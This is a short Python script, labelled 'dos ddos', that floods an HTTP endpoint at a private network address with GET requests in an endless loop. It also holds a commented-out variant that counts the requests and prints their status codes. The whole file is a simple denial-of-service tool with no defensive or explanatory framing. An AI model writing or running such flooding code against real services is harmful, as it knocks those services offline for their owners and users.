# dos ddos
import requests
url="http://192.168.0.105:5000/autorisation"
s=[]
"""for i in range(100000):
    r=requests.get(url)
    s.append(r.status_code)
    if i%1000==0:
        print(i,s)
        s=[]
print(r.text)
print(r.status_code)"""
while True:
    requests.get(url)